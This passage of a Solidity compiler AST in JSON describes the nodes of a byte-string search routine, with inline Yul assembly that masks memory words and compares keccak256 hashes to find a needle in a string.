																								}
																							},
																							"value": null,
																							"visibility": "internal"
																						}
																					],
																					"id": 1227,
																					"initialValue": null,
																					"nodeType": "VariableDeclarationStatement",
																					"src": "13508:16:0"
																				},
																				{
																					"AST": {
																						"nodeType": "YulBlock",
																						"src": "13556:41:0",
																						"statements": [
																							{
																								"nodeType": "YulAssignment",
																								"src": "13558:37:0",
																								"value": {
																									"arguments": [
																										{
																											"name": "ptr",
																											"nodeType": "YulIdentifier",
																											"src": "13580:3:0"
																										},
																										{
																											"name": "needlelen",
																											"nodeType": "YulIdentifier",
																											"src": "13585:9:0"
																										}
																									],
																									"functionName": {
																										"name": "keccak256",
																										"nodeType": "YulIdentifier",
																										"src": "13570:9:0"
																									},
																									"nodeType": "YulFunctionCall",
																									"src": "13570:25:0"
																								},
																								"variableNames": [
																									{
																										"name": "testHash",
																										"nodeType": "YulIdentifier",
																										"src": "13558:8:0"
																									}
																								]
																							}
																						]
																					},
																					"evmVersion": "istanbul",
																					"externalReferences": [
																						{
																							"declaration": 1134,
																							"isOffset": false,
																							"isSlot": false,
																							"src": "13585:9:0",
																							"valueSize": 1
																						},
																						{
																							"declaration": 1142,
																							"isOffset": false,
																							"isSlot": false,
																							"src": "13580:3:0",
																							"valueSize": 1
																						},
																						{
																							"declaration": 1226,
																							"isOffset": false,
																							"isSlot": false,
																							"src": "13558:8:0",
																							"valueSize": 1
																						}
																					],
																					"id": 1228,
																					"nodeType": "InlineAssembly",
																					"src": "13547:50:0"
																				},
																				{
																					"condition": {
																						"argumentTypes": null,
																						"commonType": {
																							"typeIdentifier": "t_bytes32",
																							"typeString": "bytes32"
																						},
																						"id": 1231,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftExpression": {
																							"argumentTypes": null,
																							"id": 1229,
																							"name": "hash",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 1210,
																							"src": "13623:4:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_bytes32",
																								"typeString": "bytes32"
																							}
																						},
																						"nodeType": "BinaryOperation",
																						"operator": "==",
																						"rightExpression": {
																							"argumentTypes": null,
																							"id": 1230,
																							"name": "testHash",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 1226,
																							"src": "13631:8:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_bytes32",
																								"typeString": "bytes32"
																							}
																						},
																						"src": "13623:16:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_bool",
																							"typeString": "bool"
																						}
																					},
																					"falseBody": null,
																					"id": 1234,
																					"nodeType": "IfStatement",
																					"src": "13619:57:0",
																					"trueBody": {
																						"expression": {
																							"argumentTypes": null,
																							"id": 1232,
																							"name": "ptr",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 1142,
																							"src": "13673:3:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"functionReturnParameters": 1140,
																						"id": 1233,
																						"nodeType": "Return",
																						"src": "13666:10:0"
																					}
																				},
																				{
																					"expression": {
																						"argumentTypes": null,
																						"id": 1237,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftHandSide": {
																							"argumentTypes": null,
																							"id": 1235,
																							"name": "ptr",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 1142,
																							"src": "13699:3:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"nodeType": "Assignment",
																						"operator": "+=",
																						"rightHandSide": {
																							"argumentTypes": null,
																							"hexValue": "31",
																							"id": 1236,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": true,
																							"kind": "number",
																							"lValueRequested": false,
																							"nodeType": "Literal",
																							"src": "13706:1:0",
																							"subdenomination": null,
																							"typeDescriptions": {
																								"typeIdentifier": "t_rational_1_by_1",
																								"typeString": "int_const 1"
																							},
																							"value": "1"
																						},
																						"src": "13699:8:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"id": 1238,
																					"nodeType": "ExpressionStatement",
																					"src": "13699:8:0"
																				}
																			]
																		},
																		"condition": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 1221,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 1217,
																				"name": "idx",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1146,
																				"src": "13450:3:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "<=",
																			"rightExpression": {
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"id": 1220,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"id": 1218,
																					"name": "selflen",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 1130,
																					"src": "13457:7:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "-",
																				"rightExpression": {
																					"argumentTypes": null,
																					"id": 1219,
																					"name": "needlelen",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 1134,
																					"src": "13467:9:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"src": "13457:19:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"src": "13450:26:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"id": 1240,
																		"initializationExpression": {
																			"expression": {
																				"argumentTypes": null,
																				"id": 1215,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftHandSide": {
																					"argumentTypes": null,
																					"id": 1213,
																					"name": "idx",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 1146,
																					"src": "13441:3:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"nodeType": "Assignment",
																				"operator": "=",
																				"rightHandSide": {
																					"argumentTypes": null,
																					"hexValue": "30",
																					"id": 1214,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "13447:1:0",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_0_by_1",
																						"typeString": "int_const 0"
																					},
																					"value": "0"
																				},
																				"src": "13441:7:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"id": 1216,
																			"nodeType": "ExpressionStatement",
																			"src": "13441:7:0"
																		},
																		"loopExpression": {
																			"expression": {
																				"argumentTypes": null,
																				"id": 1223,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"nodeType": "UnaryOperation",
																				"operator": "++",
																				"prefix": false,
																				"src": "13478:5:0",
																				"subExpression": {
																					"argumentTypes": null,
																					"id": 1222,
																					"name": "idx",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 1146,
																					"src": "13478:3:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"id": 1224,
																			"nodeType": "ExpressionStatement",
																			"src": "13478:5:0"
																		},
																		"nodeType": "ForStatement",
																		"src": "13436:291:0"
																	}
																]
															},
															"id": 1242,
															"nodeType": "IfStatement",
															"src": "12589:1153:0",
															"trueBody": {
																"id": 1208,
																"nodeType": "Block",
																"src": "12610:647:0",
																"statements": [
																	{
																		"assignments": [
																			1155
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 1155,
																				"mutability": "mutable",
																				"name": "mask",
																				"nodeType": "VariableDeclaration",
																				"overrides": null,
																				"scope": 1208,
																				"src": "12629:12:0",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				},
																				"typeName": {
																					"id": 1154,
																					"name": "bytes32",
																					"nodeType": "ElementaryTypeName",
																					"src": "12629:7:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes32",
																						"typeString": "bytes32"
																					}
																				},
																				"value": null,
																				"visibility": "internal"
																			}
																		],
																		"id": 1172,
																		"initialValue": {
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"id": 1170,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"nodeType": "UnaryOperation",
																					"operator": "~",
																					"prefix": true,
																					"src": "12652:34:0",
																					"subExpression": {
																						"argumentTypes": null,
																						"components": [
																							{
																								"argumentTypes": null,
																								"commonType": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								},
																								"id": 1168,
																								"isConstant": false,
																								"isLValue": false,
																								"isPure": false,
																								"lValueRequested": false,
																								"leftExpression": {
																									"argumentTypes": null,
																									"commonType": {
																										"typeIdentifier": "t_uint256",
																										"typeString": "uint256"
																									},
																									"id": 1166,
																									"isConstant": false,
																									"isLValue": false,
																									"isPure": false,
																									"lValueRequested": false,
																									"leftExpression": {
																										"argumentTypes": null,
																										"hexValue": "32",
																										"id": 1158,
																										"isConstant": false,
																										"isLValue": false,
																										"isPure": true,
																										"kind": "number",
																										"lValueRequested": false,
																										"nodeType": "Literal",
																										"src": "12654:1:0",
																										"subdenomination": null,
																										"typeDescriptions": {
																											"typeIdentifier": "t_rational_2_by_1",
																											"typeString": "int_const 2"
																										},
																										"value": "2"
																									},
																									"nodeType": "BinaryOperation",
																									"operator": "**",
																									"rightExpression": {
																										"argumentTypes": null,
																										"components": [
																											{
																												"argumentTypes": null,
																												"commonType": {
																													"typeIdentifier": "t_uint256",
																													"typeString": "uint256"
																												},
																												"id": 1164,
																												"isConstant": false,
																												"isLValue": false,
																												"isPure": false,
																												"lValueRequested": false,
																												"leftExpression": {
																													"argumentTypes": null,
																													"hexValue": "38",
																													"id": 1159,
																													"isConstant": false,
																													"isLValue": false,
																													"isPure": true,
																													"kind": "number",
																													"lValueRequested": false,
																													"nodeType": "Literal",
																													"src": "12660:1:0",
																													"subdenomination": null,
																													"typeDescriptions": {
																														"typeIdentifier": "t_rational_8_by_1",
																														"typeString": "int_const 8"
																													},
																													"value": "8"
																												},
																												"nodeType": "BinaryOperation",
																												"operator": "*",
																												"rightExpression": {
																													"argumentTypes": null,
																													"components": [
																														{
																															"argumentTypes": null,
																															"commonType": {
																																"typeIdentifier": "t_uint256",
																																"typeString": "uint256"
																															},
																															"id": 1162,
																															"isConstant": false,
																															"isLValue": false,
																															"isPure": false,
																															"lValueRequested": false,
																															"leftExpression": {
																																"argumentTypes": null,
																																"hexValue": "3332",
																																"id": 1160,
																																"isConstant": false,
																																"isLValue": false,
																																"isPure": true,
																																"kind": "number",
																																"lValueRequested": false,
																																"nodeType": "Literal",
																																"src": "12665:2:0",
																																"subdenomination": null,
																																"typeDescriptions": {
																																	"typeIdentifier": "t_rational_32_by_1",
																																	"typeString": "int_const 32"
																																},
																																"value": "32"
																															},
																															"nodeType": "BinaryOperation",
																															"operator": "-",
																															"rightExpression": {
																																"argumentTypes": null,
																																"id": 1161,
																																"name": "needlelen",
																																"nodeType": "Identifier",
																																"overloadedDeclarations": [],
																																"referencedDeclaration": 1134,
																																"src": "12670:9:0",
																																"typeDescriptions": {
																																	"typeIdentifier": "t_uint256",
																																	"typeString": "uint256"
																																}
																															},
																															"src": "12665:14:0",
																															"typeDescriptions": {
																																"typeIdentifier": "t_uint256",
																																"typeString": "uint256"
																															}
																														}
																													],
																													"id": 1163,
																													"isConstant": false,
																													"isInlineArray": false,
																													"isLValue": false,
																													"isPure": false,
																													"lValueRequested": false,
																													"nodeType": "TupleExpression",
																													"src": "12664:16:0",
																													"typeDescriptions": {
																														"typeIdentifier": "t_uint256",
																														"typeString": "uint256"
																													}
																												},
																												"src": "12660:20:0",
																												"typeDescriptions": {
																													"typeIdentifier": "t_uint256",
																													"typeString": "uint256"
																												}
																											}
																										],
																										"id": 1165,
																										"isConstant": false,
																										"isInlineArray": false,
																										"isLValue": false,
																										"isPure": false,
																										"lValueRequested": false,
																										"nodeType": "TupleExpression",
																										"src": "12659:22:0",
																										"typeDescriptions": {
																											"typeIdentifier": "t_uint256",
																											"typeString": "uint256"
																										}
																									},
																									"src": "12654:27:0",
																									"typeDescriptions": {
																										"typeIdentifier": "t_uint256",
																										"typeString": "uint256"
																									}
																								},
																								"nodeType": "BinaryOperation",
																								"operator": "-",
																								"rightExpression": {
																									"argumentTypes": null,
																									"hexValue": "31",
																									"id": 1167,
																									"isConstant": false,
																									"isLValue": false,
																									"isPure": true,
																									"kind": "number",
																									"lValueRequested": false,
																									"nodeType": "Literal",
																									"src": "12684:1:0",
																									"subdenomination": null,
																									"typeDescriptions": {
																										"typeIdentifier": "t_rational_1_by_1",
																										"typeString": "int_const 1"
																									},
																									"value": "1"
																								},
																								"src": "12654:31:0",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							}
																						],
																						"id": 1169,
																						"isConstant": false,
																						"isInlineArray": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"nodeType": "TupleExpression",
																						"src": "12653:33:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				],
																				"id": 1157,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"lValueRequested": false,
																				"nodeType": "ElementaryTypeNameExpression",
																				"src": "12644:7:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_type$_t_bytes32_$",
																					"typeString": "type(bytes32)"
																				},
																				"typeName": {
																					"id": 1156,
																					"name": "bytes32",
																					"nodeType": "ElementaryTypeName",
																					"src": "12644:7:0",
																					"typeDescriptions": {
																						"typeIdentifier": null,
																						"typeString": null
																					}
																				}
																			},
																			"id": 1171,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "typeConversion",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "12644:43:0",
																			"tryCall": false,
																			"typeDescriptions": {
																				"typeIdentifier": "t_bytes32",
																				"typeString": "bytes32"
																			}
																		},
																		"nodeType": "VariableDeclarationStatement",
																		"src": "12629:58:0"
																	},
																	{
																		"assignments": [
																			1174
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 1174,
																				"mutability": "mutable",
																				"name": "needledata",
																				"nodeType": "VariableDeclaration",
																				"overrides": null,
																				"scope": 1208,
																				"src": "12709:18:0",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				},
																				"typeName": {
																					"id": 1173,
																					"name": "bytes32",
																					"nodeType": "ElementaryTypeName",
																					"src": "12709:7:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes32",
																						"typeString": "bytes32"
																					}
																				},
																				"value": null,
																				"visibility": "internal"
																			}
																		],
																		"id": 1175,
																		"initialValue": null,
																		"nodeType": "VariableDeclarationStatement",
																		"src": "12709:18:0"
																	},
																	{
																		"AST": {
																			"nodeType": "YulBlock",
																			"src": "12755:45:0",
																			"statements": [
																				{
																					"nodeType": "YulAssignment",
																					"src": "12757:41:0",
																					"value": {
																						"arguments": [
																							{
																								"arguments": [
																									{
																										"name": "needleptr",
																										"nodeType": "YulIdentifier",
																										"src": "12781:9:0"
																									}
																								],
																								"functionName": {
																									"name": "mload",
																									"nodeType": "YulIdentifier",
																									"src": "12775:5:0"
																								},
																								"nodeType": "YulFunctionCall",
																								"src": "12775:16:0"
																							},
																							{
																								"name": "mask",
																								"nodeType": "YulIdentifier",
																								"src": "12793:4:0"
																							}
																						],
																						"functionName": {
																							"name": "and",
																							"nodeType": "YulIdentifier",
																							"src": "12771:3:0"
																						},
																						"nodeType": "YulFunctionCall",
																						"src": "12771:27:0"
																					},
																					"variableNames": [
																						{
																							"name": "needledata",
																							"nodeType": "YulIdentifier",
																							"src": "12757:10:0"
																						}
																					]
																				}
																			]
																		},
																		"evmVersion": "istanbul",
																		"externalReferences": [
																			{
																				"declaration": 1155,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "12793:4:0",
																				"valueSize": 1
																			},
																			{
																				"declaration": 1174,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "12757:10:0",
																				"valueSize": 1
																			},
																			{
																				"declaration": 1136,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "12781:9:0",
																				"valueSize": 1
																			}
																		],
																		"id": 1176,
																		"nodeType": "InlineAssembly",
																		"src": "12746:54:0"
																	},
																	{
																		"assignments": [
																			1178
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 1178,
																				"mutability": "mutable",
																				"name": "end",
																				"nodeType": "VariableDeclaration",
																				"overrides": null,
																				"scope": 1208,
																				"src": "12821:8:0",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"typeName": {
																					"id": 1177,
																					"name": "uint",
																					"nodeType": "ElementaryTypeName",
																					"src": "12821:4:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"value": null,
																				"visibility": "internal"
																			}
																		],
																		"id": 1184,
																		"initialValue": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 1183,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"id": 1181,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"id": 1179,
																					"name": "selfptr",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 1132,
																					"src": "12832:7:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "+",
																				"rightExpression": {
																					"argumentTypes": null,
																					"id": 1180,
																					"name": "selflen",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 1130,
																					"src": "12842:7:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"src": "12832:17:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "-",
																			"rightExpression": {
																				"argumentTypes": null,
																				"id": 1182,
																				"name": "needlelen",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1134,
																				"src": "12852:9:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"src": "12832:29:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "VariableDeclarationStatement",
																		"src": "12821:40:0"
																	},
																	{
																		"assignments": [
																			1186
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 1186,
																				"mutability": "mutable",
																				"name": "ptrdata",
																				"nodeType": "VariableDeclaration",
																				"overrides": null,
																				"scope": 1208,
																				"src": "12880:15:0",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				},
																				"typeName": {
																					"id": 1185,
																					"name": "bytes32",
																					"nodeType": "ElementaryTypeName",
																					"src": "12880:7:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes32",
																						"typeString": "bytes32"
																					}
																				},
																				"value": null,
																				"visibility": "internal"
																			}
																		],
																		"id": 1187,
																		"initialValue": null,
																		"nodeType": "VariableDeclarationStatement",
																		"src": "12880:15:0"
																	},
																	{
																		"AST": {
																			"nodeType": "YulBlock",
																			"src": "12923:36:0",
																			"statements": [
																				{
																					"nodeType": "YulAssignment",
																					"src": "12925:32:0",
																					"value": {
																						"arguments": [
																							{
																								"arguments": [
																									{
																										"name": "ptr",
																										"nodeType": "YulIdentifier",
																										"src": "12946:3:0"
																									}
																								],
																								"functionName": {
																									"name": "mload",
																									"nodeType": "YulIdentifier",
																									"src": "12940:5:0"
																								},
																								"nodeType": "YulFunctionCall",
																								"src": "12940:10:0"
																							},
																							{
																								"name": "mask",
																								"nodeType": "YulIdentifier",
																								"src": "12952:4:0"
																							}
																						],
																						"functionName": {
																							"name": "and",
																							"nodeType": "YulIdentifier",
																							"src": "12936:3:0"
																						},
																						"nodeType": "YulFunctionCall",
																						"src": "12936:21:0"
																					},
																					"variableNames": [
																						{
																							"name": "ptrdata",
																							"nodeType": "YulIdentifier",
																							"src": "12925:7:0"
																						}
																					]
																				}
																			]
																		},
																		"evmVersion": "istanbul",
																		"externalReferences": [
																			{
																				"declaration": 1155,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "12952:4:0",
																				"valueSize": 1
																			},
																			{
																				"declaration": 1142,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "12946:3:0",
																				"valueSize": 1
																			},
																			{
																				"declaration": 1186,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "12925:7:0",
																				"valueSize": 1
																			}
																		],
																		"id": 1188,
																		"nodeType": "InlineAssembly",
																		"src": "12914:45:0"
																	},
																	{
																		"body": {
																			"id": 1204,
																			"nodeType": "Block",
																			"src": "13010:203:0",
																			"statements": [
																				{
																					"condition": {
																						"argumentTypes": null,
																						"commonType": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						},
																						"id": 1194,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftExpression": {
																							"argumentTypes": null,
																							"id": 1192,
																							"name": "ptr",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 1142,
																							"src": "13037:3:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"nodeType": "BinaryOperation",
																						"operator": ">=",
																						"rightExpression": {
																							"argumentTypes": null,
																							"id": 1193,
																							"name": "end",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 1178,
																							"src": "13044:3:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"src": "13037:10:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_bool",
																							"typeString": "bool"
																						}
																					},
																					"falseBody": null,
																					"id": 1199,
																					"nodeType": "IfStatement",
																					"src": "13033:65:0",
																					"trueBody": {
																						"expression": {
																							"argumentTypes": null,
																							"commonType": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							},
																							"id": 1197,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": false,
																							"lValueRequested": false,
																							"leftExpression": {
																								"argumentTypes": null,
																								"id": 1195,
																								"name": "selfptr",
																								"nodeType": "Identifier",
																								"overloadedDeclarations": [],
																								"referencedDeclaration": 1132,
																								"src": "13081:7:0",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							},
																							"nodeType": "BinaryOperation",
																							"operator": "+",
																							"rightExpression": {
																								"argumentTypes": null,
																								"id": 1196,
																								"name": "selflen",
																								"nodeType": "Identifier",
																								"overloadedDeclarations": [],
																								"referencedDeclaration": 1130,
																								"src": "13091:7:0",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							},
																							"src": "13081:17:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"functionReturnParameters": 1140,
																						"id": 1198,
																						"nodeType": "Return",
																						"src": "13074:24:0"
																					}
																				},
																				{
																					"expression": {
																						"argumentTypes": null,
																						"id": 1201,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"nodeType": "UnaryOperation",
																						"operator": "++",
																						"prefix": false,
																						"src": "13121:5:0",
																						"subExpression": {
																							"argumentTypes": null,
																							"id": 1200,
																							"name": "ptr",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 1142,
																							"src": "13121:3:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"id": 1202,
																					"nodeType": "ExpressionStatement",
																					"src": "13121:5:0"
																				},
																				{
																					"AST": {
																						"nodeType": "YulBlock",
																						"src": "13158:36:0",
																						"statements": [
																							{
																								"nodeType": "YulAssignment",
																								"src": "13160:32:0",
																								"value": {
																									"arguments": [
																										{
																											"arguments": [
																												{
																													"name": "ptr",
																													"nodeType": "YulIdentifier",
																													"src": "13181:3:0"
																												}
																											],
																											"functionName": {
																												"name": "mload",
																												"nodeType": "YulIdentifier",
																												"src": "13175:5:0"
																											},
																											"nodeType": "YulFunctionCall",
																											"src": "13175:10:0"
																										},
																										{
																											"name": "mask",
																											"nodeType": "YulIdentifier",
																											"src": "13187:4:0"
																										}
																									],
																									"functionName": {
																										"name": "and",
																										"nodeType": "YulIdentifier",
																										"src": "13171:3:0"
																									},
																									"nodeType": "YulFunctionCall",
																									"src": "13171:21:0"
																								},
																								"variableNames": [
																									{
																										"name": "ptrdata",
																										"nodeType": "YulIdentifier",
																										"src": "13160:7:0"
																									}
																								]
																							}
																						]
																					},
																					"evmVersion": "istanbul",
																					"externalReferences": [
																						{
																							"declaration": 1155,
																							"isOffset": false,
																							"isSlot": false,
																							"src": "13187:4:0",
																							"valueSize": 1
																						},
																						{
																							"declaration": 1142,
																							"isOffset": false,
																							"isSlot": false,
																							"src": "13181:3:0",
																							"valueSize": 1
																						},
																						{
																							"declaration": 1186,
																							"isOffset": false,
																							"isSlot": false,
																							"src": "13160:7:0",
																							"valueSize": 1
																						}
																					],
																					"id": 1203,
																					"nodeType": "InlineAssembly",
																					"src": "13149:45:0"
																				}
																			]
																		},
																		"condition": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_bytes32",
																				"typeString": "bytes32"
																			},
																			"id": 1191,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 1189,
																				"name": "ptrdata",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1186,
																				"src": "12987:7:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "!=",
																			"rightExpression": {
																				"argumentTypes": null,
																				"id": 1190,
																				"name": "needledata",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1174,
																				"src": "12998:10:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				}
																			},
																			"src": "12987:21:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"id": 1205,
																		"nodeType": "WhileStatement",
																		"src": "12980:233:0"
																	},
																	{
																		"expression": {
																			"argumentTypes": null,
																			"id": 1206,
																			"name": "ptr",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 1142,
																			"src": "13238:3:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"functionReturnParameters": 1140,
																		"id": 1207,
																		"nodeType": "Return",
																		"src": "13231:10:0"
																	}
																]
															}
														}
													]
												}
											},
											{
												"expression": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1247,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 1245,
														"name": "selfptr",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1132,
														"src": "13770:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "+",
													"rightExpression": {
														"argumentTypes": null,
